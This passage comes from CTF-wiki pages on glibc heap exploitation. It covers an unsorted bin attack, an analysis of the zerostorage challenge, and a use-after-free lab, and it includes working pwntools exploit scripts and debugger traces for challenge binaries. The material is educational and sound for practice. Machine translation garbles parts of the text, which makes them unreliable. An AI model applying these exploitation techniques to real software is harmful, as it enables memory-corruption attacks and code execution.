edit_heap ( idx , size , content ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def del_heap ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) create_heap ( 0x20 , \"dada\" ) # 0 create_heap ( 0x80 , \"dada\" ) # 1 # in order not to merge into top chunk create_heap ( 0x20 , \"dada\" ) # 2 del_heap ( 1 ) magic = 0x6020c0 fd = 0 bk = magic - 0x10 edit_heap ( 0 , 0x20 + 0x20 , \"a\" * 0x20 + p64 ( 0 ) + p64 ( 0x91 ) + p64 ( fd ) + p64 ( bk )) create_heap ( 0x80 , \"dada\" ) #trigger unsorted bin attack r . recvuntil ( \":\" ) r . sendline ( \"4869\" ) r . interactive ()","title":"Use"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#2016-0ctf-zerostorage-to-be-completed","text":"Note: To be completed further. Here we introduce the [zerostorage] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/zerostorage ) of 0CTF 2016 as an example. This question was given to the server version and kernel version of the server, so I can debug it exactly the next time. Here we will debug directly with our local machine. However, in the current Ubuntu 16.04, due to further randomization, the relative offset between the location where libc is loaded and the location where the program module is loaded is no longer fixed, so the strategy of BriefX cannot be used again. It seems that only angelboy can be used. Strategy.","title":"2016 0CTF zerostorage-To be completed"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#security-check","text":"It can be seen that the program has opened all protections. pwndbg> checksec [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled","title":"Security check"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-function-analysis","text":"The program manages the storage space in the bss segment, with the functions of insert, delete, merge, delete, view, enumerate, and exit. The structure of this storage is as follows 00000000 Storage struc ; (sizeof=0x18, mappedto_7) 00000000 ; XREF: .bss:storage_list/r 00000000 use dq ? 00000008 size dq ? 00000010 xor_addr dq ? 00000018 Storage ends","title":"Basic function analysis"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#insert-1","text":"The basic functions are as follows Look at the storage array one by one to find the first unused element, but this array is up to 32. The length of the content that needs to be stored to read the storage element. If the length is not greater than 0, exit directly; Otherwise, if the number of bytes requested is less than 128, it is set to 128; Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value; Otherwise, set to 4096. Use calloc to assign the specified length. Note that calloc will initialize chunk to 0. Suppress the memory address assigned by the calloc with a memory of the bss segment (the initial time is a random number) to get a new memory address. Read in the content according to the size of the stored storage. Save the size of the corresponding storage and the address of the stored content to the corresponding storage element and mark the element as available. However, it should be noted that the size of the storage recorded here is the size of your own input! ! ! Increment the number of storage num.","title":"insert-1"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#update-2","text":"If there is no storage, return directly. Read the id of the storage element to be updated. If the id is greater than 31 or is currently not in use, the description is incorrect and returns directly. Read the length of the content that the storage element needs to store after the update. If the length is not greater than 0, exit directly; Otherwise, if the number of bytes requested is less than 128, it is set to 128; Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value; Otherwise, set to 4096. Obtain the address of the original storage content according to the random number corresponding to the bss segment. If the length required after the update is not equal to the length before the update, use realloc to reassign the memory. Read the data again and update the storage element.","title":"update-2"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#merge-3","text":"If the element being used is no more than one, then you cannot merge and you can exit directly. Determine if the storage is full. If it is not full, find the free one. Read the id of merge_from and the id number of merge_to, respectively, and detect the corresponding size and usage status. Calculate the space required for the two merges together based on the size of the initial user input. If it is not greater than 128, then it will not apply for a new space , otherwise apply for a new space of the corresponding size. Copy the contents of merge_to and merge_from to the corresponding location. The memory address of the last stored merge_from content was released, but was not set to NULL. At the same time, the memory address for storing the merge_to content is not released, and the corresponding storage address or the subsequent address is only set to NULL. ** But it should be noted that, at the time of merge, it is not detected whether the IDs of the two storages are the same.","title":"merge-3"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#delete-4","text":"If no elements are stored, return directly. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly. If the corresponding element of storage is not in use, it will also return. After that, the fields corresponding to the elements are set to NULL and the corresponding memory is released.","title":"delete-4"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#view-5","text":"If no elements are stored, return directly. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly. If the corresponding element of storage is not in use, it will also return. Enter the contents of the corresponding storage.","title":"view-5"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#list-6","text":"If no elements are stored, return directly. Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly. Traverse all the storages in use, enter their corresponding subscripts and the size of the corresponding storage.","title":"list-6"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#vulnerability-determination","text":"Through such a simple analysis, we can basically determine that the vulnerability is mainly concentrated in the insert operation and the merge operation, especially when we merge two smaller size storage, there will be some problems. Let's take a detailed analysis. If we insert a smaller size (such as 8) storage A in the insert process, then when we merge, let's say that we select the two storages of merge are A, then the program will Directly, the content of A will be added directly to the original content of A, and then the memory of the corresponding data portion of A will be freed, but this does not have any effect, because the address of A storage content is Assigned to another storage, when accessing the contents of the storage B part of the merge, since the address of the stored data part of B is actually the address of the stored data corresponding to A, the content of the data part of A is printed. However, we just released the memory corresponding to A, and A is not in the fast bin range, so it will only be placed in the unsorted bin (and only one at this time), so the fd and bk of A are stored at this time. Is a base address of the unsorted bin. If we have deleted a storage C before the merge, then after we merge A, A will be inserted in the header of the unsorted bin's doubly linked list, so its fd is the address corresponding to C, and bk is a base of unsorted bin. address. This way we can directly leak two addresses. And it should be noted that we can still modify the content of B after the merge, so this is actually a Use After Free.","title":"Vulnerability determination"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#utilization-process","text":"Unsorted Bin Attack Use the unsorted bin attack to modify the global_max_fast global variable. Since the global_max_fast variable is the size of the largest Fast chunk, it is rewritten as the address of the unsorted bin (generally a large positive number), so that the subsequent chunks can be made. Being used as a fast chunk, you can do a Fast bin attack. Fast Bin Attack","title":"Utilization process"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#topic","text":"","title":"topic"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#references","text":"http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/ https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py","title":"references"},{"location":"pwn/linux/glibc-heap/use_after_free/","text":"Use After Free \u00b6 Principle \u00b6 Simply put, Use After Free is what it literally means, and is used again when a block of memory is released. But in fact, here are the following situations After the memory block is released, its corresponding pointer is set to NULL, and then used again, the natural program will crash. After the memory block is released, its corresponding pointer is not set to NULL, and then there is no code to modify the memory block before it is used next time, then the program is likely to work properly**. After the memory block is released, its corresponding pointer is not set to NULL, but before it is used next time, there is code to modify the memory, then when the program uses the memory again, is very There may be strange problems . The Use After Free vulnerability we generally refer to is mainly the latter two. In addition, we generally say that the memory pointer that was not set to NULL after being released is the dangling pointer. Here is a simple example #include <stdio.h> #include <stdlib.h> typedef struct name { char * myname ; void ( * func )( char * str ); } NAME ; void myprint ( char * str ) { printf ( \"%s \\n \" , str ); } void printmyname () { printf ( \"call print my name \\n \" ); } int main () { NAME * a ; a = ( NAME * ) malloc ( sizeof ( struct name )); a -> func = myprint ; a -> myname = \"I can also use it\" ; a -> func ( \"this is my function\" ); // free without modify free ( a ); a -> func ( \"I can also use it\" ); // free with modify a -> func = printmyname ; a -> func ( \"this is my function\" ); // set NULL a = NULL ; printf ( \"this pogram will crash... \\n \" ); a -> func ( \"can not be printed...\" ); } The results are as follows \u279c use_after_free git: ( use_after_free ) \u2717 ./use_after_free this is my function I can also use it call print my name this pogram will crash... [ 1 ] 38738 segmentation fault ( core dumped ) ./use_after_free example \u00b6 Here we take [lab 10 hacknote] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote ) in HITCON-training as an example. Functional Analysis \u00b6 We can simply analyze the program, we can see that there is a menu function at the beginning of the program, which has puts ( \" 1. Add note \" ); puts ( \" 2. Delete note \" ); puts ( \" 3. Print note \" ); puts ( \" 4. Exit \" ); Therefore, the program should have three main functions. The program then performs the appropriate function based on the user's input. add_note \u00b6 According to the program, we can see that the program can add up to 5 notes. Each note has two fields, put and content, where put is set to a function whose function outputs content specific content. unsigned int add_note () { note * v0 ; // ebx signed int i ; // [esp+Ch] [ebp-1Ch] int size ; // [esp+10h] [ebp-18h] char buf ; // [esp+14h] [ebp-14h] unsigned int v5 ; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword ( 0x14u ); if ( count <= 5 ) { for ( i = 0 ; i <= 4 ; ++ i ) { if ( ! notelist [ i ] ) { notelist [ i ] = malloc ( 8u ); if ( ! notelist [ i ] ) { puts ( \"Alloca Error\" ); exit ( -1 ); } notelist [ i ] -> put = print_note_content ; printf ( \"Note size :\" ); read ( 0 , & buf , 8u ); size = atoi ( & buf ); v0 = notelist [ i ]; v0 -> content = malloc ( size ); if ( ! notelist [ i ] -> content ) { puts ( \"Alloca Error\" ); exit ( -1 ); } printf ( \"Content :\" ); read ( 0 , notelist [ i ] -> content , size ); puts ( \"Success !\" ); ++ count ; return __readgsdword ( 0x14u ) ^ v5 ; } } } else { puts ( \"Full\" ); } return __readgsdword ( 0x14u ) ^ v5 ; } print_note \u00b6 Print_note simply outputs the contents of the note corresponding to the index based on the index of the given note. unsigned int print_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & amp ; buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) notelist [ v1 ] -> put ( notelist [ v1 ]); return __readgsdword ( 0x14u ) ^ v3 ; } delete_note \u00b6 Delete_note will release the corresponding note based on the given index. However, it is worth noting that when deleting, it is simply free, but not set to NULL, then obviously, there is the case of Use After Free. unsigned int del_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & amp ; buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) { free ( notelist [ v1 ] -> content ); free ( notelist [ v1 ]); puts ( \"Success\" ); } return __readgsdword ( 0x14u ) ^ v3 ; } Utilization Analysis \u00b6 We can see that Use After Free may indeed happen, so how can we make it happen and use it? It is also important to note that there is also a magic function in this program. Is it possible to make the program execute the magic function by using after after? A very straightforward idea is to modify the put field of the note to the address of the magic function, thus implementing the magic function when executing the print note. So how do you do this? We can simply look at the specific process of each note generation. The program applies 8-byte memory to store the put and content pointers in the note. The program requests a memory of the specified size based on the size entered, and then stores the content. +-----------------+ | put | +-----------------+ | content | size +-----------------+------------------->+----------------+ | real | | content | | | +----------------+ So, according to what we learned in the heap implementation, it is clear that the note is a fastbin chunk (16 bytes in size). Our goal is to have the put field of a note as the function address of magic, then we have to find a way to make the put pointer of a note overwritten as a magic address. Since there is only one place in the program to assign a put. So we have to use the time to write real content to cover. The specific ideas adopted are as follows Apply note0, real content size is 16 (the size is different from the bin where the note size is located) Apply note1, real content size is 16 (the size is different from the bin where the note size is located) Release note0 Release note1 At this point, the fast bin chunk size of 16 is note1->note0 Apply note2 and set the size of real content to 8, then according to the heap allocation rules note2 will actually allocate the memory block corresponding to note1. real content The corresponding chunk is actually note0. If we write the magic address to the chunk part of the note2 real content at this time, then since we don't have note0 NULL. When we try to output note0 again, the program will call the magic function. Using scripts \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './hacknote' ) def addnote ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def delnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def printnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) #gdb.attach(r) magic = 0x08048986 addnote ( 32 , \"aaaa\" ) # add note 0 addnote ( 32 , & quot ; daa & quot ;) # add note 1 delnote ( 0 ) # delete note 0 delnote ( 1 ) # delete note 1 addnote ( 8 , p32 ( magic )) # add note 2 printnote ( 0 ) # print note 0 r . interactive () We can look at the execution process specifically, first break down the breakpoint Two malloc breakpoints gef\u27a4 b *0x0804875C Breakpoint 1 at 0x804875c gef\u27a4 b *0x080486CA Breakpoint 2 at 0x80486ca Two free breakpoints gef\u27a4 b *0x08048893 Breakpoint 3 at 0x8048893 gef\u27a4 b *0x080488A9 Breakpoint 4 at 0x80488a9 Then continue to execute the program, you can see that when you apply for note0, the requested memory block address is 0x0804b008. (eax storage function return value) ` asm $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x00000000 $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x080486cf \u2192 add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x80486c2 <add_note+76> add DWORD PTR [eax], eax 0x80486c4 <add_note+78> add BYTE PTR [ebx+0x86a0cec], al 0x80486ca <add_note+84> call 0x80484e0 <malloc@plt> \u2192 0x80486cf add esp, 0x10 0x80486d2 <add_note+92> mov edx, eax 0x80486d4 <add_note+94> mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 <add_note+97> mov DWORD PTR [eax*4+0x804a070], edx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000008 \u2190 $esp 0xffffcf14\u2502+0x04: 0x00000000 0xffffcf18\u2502+0x08: 0xf7e29ef5 \u2192 add eax, 0x18210b 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type to continue, or q to quit--- [#0] 0x80486cf \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b008 UsedChunk(addr=0x804b008, size=0x10) Chunk size: 16 (0x10) Usable size: 12 (0xc) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off **The address of the content of the application note 0 is 0x0804b018** `` `asm $eax : 0x0804b018 \u2192 0x00000000 $ebx : 0x0804b008 \u2192 0x0804865b \u2192 <print_note_content+0> push ebp $ ecx: 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b018 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000020 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $ you are: 0xf7fac000 \u2192 0x001b1db0 $ edi: 0xf7fac000 \u2192 0x001b1db0 $ Eip: 0x08048761 \u2192 <add_note+235> add esp, 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $ is: 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386 ]\u2500\u2500\u2500\u2500 0x8048752 <add_note+220> mov al, ds:0x458b0804 0x8048757 <add_note+225> call 0x581173df 0x804875c <add_note+230> call 0x80484e0 <malloc@plt> \u2192 0x8048761 <add_note+235> add esp, 0x10 0x8048764 <add_note+238> mov DWORD PTR [ebx+0x4], eax 0x8048767 <add_note+241> mov eax, DWORD PTR [ebp-0x1c] 0x804876a <add_note+244> mov eax, DWORD PTR [eax*4+0x804a070] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf10', 'l8'] 8 0xffffcf10\u2502+0x00: 0x00000020 \u2190 $esp 0xffffcf14\u2502+0x04: 0xffffcf34 \u2192 0xf70a3233 0xffffcf18\u2502+0x08: 0x00000008 0xffffcf1c\u2502+0x0c: 0xf7e27260 \u2192 <atoi+16> add esp, 0x1c 0xffffcf20\u2502+0x10: 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0xffffcf24\u2502+0x14: 0x00000000 0xffffcf28\u2502+0x18: 0x0000000a 0xffffcf2c\u2502+0x1c: 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ]\u2500\u2500\u2500\u2500 ---Type <return> to continue, or q <return> to quit--- [#0] 0x8048761 \u2192 Name: add_note() [#1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 heap chunk 0x0804b018 UsedChunk(addr=0x804b018, size=0x28) Chunk size: 40 (0x28) Usable size: 36 (0x24) Previous chunk size: 0 (0x0) PREV_INUSE flag: On IS_MMAPPED flag: Off NON_MAIN_ARENA flag: Off Similarly, we can get the address of note1 and the address of its content are 0x0804b040 and 0x0804b050 respectively. At the same time, we can also see that the content corresponding to note0 and note1 is indeed the corresponding memory block. ` asm given grip [+] Searching 'aaaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b018 - 0x804b01c \u2192 \"aaaa\" grap daa [+] Searching 'deaa' in memory [+] In '[heap]'(0x804b000-0x806c000), permission=rw- 0x804b050 - 0x804b054 \u2192 \"good\" Here is the free process. We can find in turn that the content of note0 is free first. `` `asm \u2192 0x8048893 <del_note+143> call 0x80484c0 <free@plt> \u21b3 0x80484c0 <free@plt+0> jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb <free@plt+11> jmp 0x8048480 0x80484d0 <__stack_chk_fail@plt+0> jmp DWORD PTR ds:0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcf20', 'l8'] 8 0xffffcf20\u2502+0x00: 0x0804b018 \u2192 \"aaaa\" \u2190 $esp Then note0 itself ` asm \u2192 0x80488a9 call 0x80484c0 free@plt \u21b3 0x80484c0 free@plt+0 jmp DWORD PTR ds:0x804a018 0x80484c6 <free@plt+6> push 0x18 0x80484cb free@plt+11 jmp 0x8048480 0x80484d0 __stack_chk_fail@plt+0 jmp DWORD PTR ds:0x804a01c 